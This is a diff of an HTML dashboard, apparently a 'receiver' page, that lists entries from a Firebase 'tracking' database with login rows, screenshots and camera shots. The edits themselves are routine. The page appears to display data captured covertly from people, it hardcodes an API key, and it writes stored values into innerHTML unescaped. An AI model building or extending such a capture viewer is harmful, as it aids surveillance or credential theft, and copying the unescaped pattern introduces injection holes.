@@ -20,8 +20,8 @@
         @media (max-width: 768px) { .login-box { padding: 10px; } h2 { font-size: 18px; } table { min-width: 0; display: block; overflow-x: auto; } th, td { padding: 8px 10px; font-size: 12px; } img.screenshot, img.camera-shot { max-width: 80px; } th, td { min-width: 100px; } }
         @media (max-width: 480px) { th, td { padding: 6px 8px; font-size: 10px; } img.screenshot, img.camera-shot { max-width: 60px; } }
     </style>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 </head>
 <body>
     <div class="login-box">
@@ -64,8 +64,10 @@
                 <tbody id="loginBody"></tbody>
             </table>
         </div>
+        <p><a href="index.html">Back to Login</a></p>
     </div>
     <script>
+        // Replace this with your own firebaseConfig if you created a new Firebase project
         const firebaseConfig = {
             apiKey: "AIzaSyAtRqJeS7UaxHHVRwZ3ov-8jXVToVvGuKg",
             authDomain: "tracking-d2d42.firebaseapp.com",
@@ -124,7 +126,10 @@
                         row.insertCell().innerHTML = entry.cameraShot && entry.cameraShot !== 'N/A' ? `<img class="camera-shot" src="${entry.cameraShot}" alt="Camera Shot">` : 'N/A';
                     });
                 }
-            }, error => console.error('Firestore error:', error));
+            }, error => {
+                console.error('Firestore error on receiver.html:', error.message);
+                alert('Failed to load data: ' + error.message);
+            });
         }
         updateTable();
     </script>
